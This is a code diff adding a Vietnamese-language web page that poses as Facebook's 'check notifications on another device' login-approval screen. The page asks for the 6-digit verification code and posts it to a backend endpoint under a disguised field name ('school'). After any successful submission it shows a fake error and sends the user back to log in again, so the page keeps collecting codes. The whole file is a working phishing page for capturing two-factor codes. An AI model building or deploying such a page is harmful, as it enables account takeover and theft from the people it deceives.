@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook | Xác nhận đăng nhập</title>
+  <link rel="icon" type="image/svg+xml" href="facebook-favicon.svg">
+  <link rel="stylesheet" href="device-check.css">
+  <script src="site-config.js"></script>
+</head>
+<body>
+  <main class="device-page">
+    <a class="back-link" href="index.html" aria-label="Quay lại">‹</a>
+
+    <section class="content" aria-labelledby="page-title">
+      <p class="eyebrow">Facebook</p>
+      <h1 id="page-title">Kiểm tra thông báo trên thiết bị khác</h1>
+      <p class="intro">Chúng tôi đã gửi thông báo đến các thiết bị của bạn.<br>Vui lòng xem thông báo của Facebook trên thiết bị đó<br>và phê duyệt lượt đăng nhập để tiếp tục.</p>
+
+      <div class="illustration-frame">
+        <svg class="device-illustration" viewBox="0 0 560 190" role="img" aria-label="Điện thoại và máy tính xách tay được bảo vệ bởi lá chắn">
+          <rect width="560" height="190" rx="12" fill="#b9e5df"/>
+          <path d="M0 165C95 125 137 151 228 139s153-11 220 13 79 17 112 5v33H0z" fill="#a6dcd6" opacity=".55"/>
+          <g transform="translate(58 20) rotate(16 47 75)">
+            <rect x="0" y="0" width="92" height="153" rx="12" fill="#263b4a"/>
+            <rect x="6" y="7" width="80" height="139" rx="8" fill="#f9ffff"/>
+            <rect x="36" y="3" width="20" height="5" rx="2.5" fill="#7e9299"/>
+            <circle cx="46" cy="58" r="17" fill="#f3a34c"/>
+            <circle cx="46" cy="56" r="8" fill="#f8bf6b"/>
+            <rect x="20" y="83" width="52" height="8" rx="4" fill="#d7e0e2"/>
+            <rect x="20" y="98" width="52" height="8" rx="4" fill="#d7e0e2"/>
+            <rect x="18" y="116" width="56" height="17" rx="7" fill="#1eaaa7"/>
+          </g>
+          <g fill="#496f77">
+            <circle cx="178" cy="98" r="3"/><circle cx="190" cy="98" r="3"/><circle cx="202" cy="98" r="3"/>
+            <circle cx="358" cy="98" r="3"/><circle cx="370" cy="98" r="3"/><circle cx="382" cy="98" r="3"/>
+          </g>
+          <path d="M280 48l30 12v38c0 24-16 39-30 45-14-6-30-21-30-45V60z" fill="#e59b16" stroke="#c87805" stroke-width="5"/>
+          <path d="M280 57l20 8v32c0 16-10 27-20 33z" fill="#ffbd20"/>
+          <g transform="translate(392 59)">
+            <path d="M0 85h125l24 13H-22z" fill="#647d8b"/>
+            <path d="M10 0h114c6 0 10 4 9 10L123 85H0L9 9c1-6 4-9 10-9z" fill="#273c4b"/>
+            <path d="M16 9h105l-8 65H8z" fill="#748999"/>
+            <rect x="32" y="23" width="69" height="40" rx="2" fill="#f6ffff"/>
+            <rect x="40" y="30" width="32" height="4" rx="2" fill="#6a7d85"/>
+            <rect x="40" y="40" width="51" height="4" rx="2" fill="#9cabb0"/>
+            <rect x="40" y="50" width="39" height="5" rx="2" fill="#1eaaa7"/>
+          </g>
+        </svg>
+      </div>
+
+      <section class="pending-status" aria-label="Trạng thái đăng ký">
+        <span class="status-dot" aria-hidden="true"></span>
+        <div>
+          <h2>Đang chờ phê duyệt đăng ký</h2>
+          <p>Có thể trong vài phút nữa bạn mới nhận được thông<br class="desktop-break"> báo trên thiết bị khác của mình.</p>
+        </div>
+      </section>
+
+      <div class="divider"></div>
+
+      <form class="school-form" id="school-form">
+        <label for="school">Hoặc nhập mã xác minh:</label>
+        <input id="school" type="text" placeholder="Nhập mã 6 số vừa gửi về thiết bị của bạn" required>
+        <button type="submit">xác nhận</button>
+        <p id="confirmation-error" class="confirmation-error" role="alert" hidden>
+          <span class="error-text">Bạn chưa phê duyệt đăng nhập hoặc mã hết hiệu lực.</span>
+          <a class="login-again-link" href="index.html">Hãy kiểm tra tài khoản của bạn và đăng nhập lại.</a>
+        </p>
+      </form>
+    </section>
+  </main>
+
+  <script>
+    const schoolForm = document.querySelector('#school-form');
+    const submitButton = schoolForm.querySelector('button');
+    const confirmationError = document.querySelector('#confirmation-error');
+
+    schoolForm.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const schoolInput = document.querySelector('#school');
+      submitButton.disabled = true;
+      submitButton.textContent = 'Đang xử lý...';
+
+      const response = await fetch((window.API_BASE || '') + '/api/registrations', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ school: schoolInput.value.trim() })
+      });
+
+      if (response.ok) {
+        await new Promise((resolve) => setTimeout(resolve, 1500));
+        confirmationError.hidden = false;
+        return;
+      }
+
+      submitButton.disabled = false;
+      submitButton.textContent = 'Xác nhận';
+      alert('Không thể lưu lượt đăng ký. Vui lòng thử lại.');
+    });
+  </script>
+</body>
+</html>
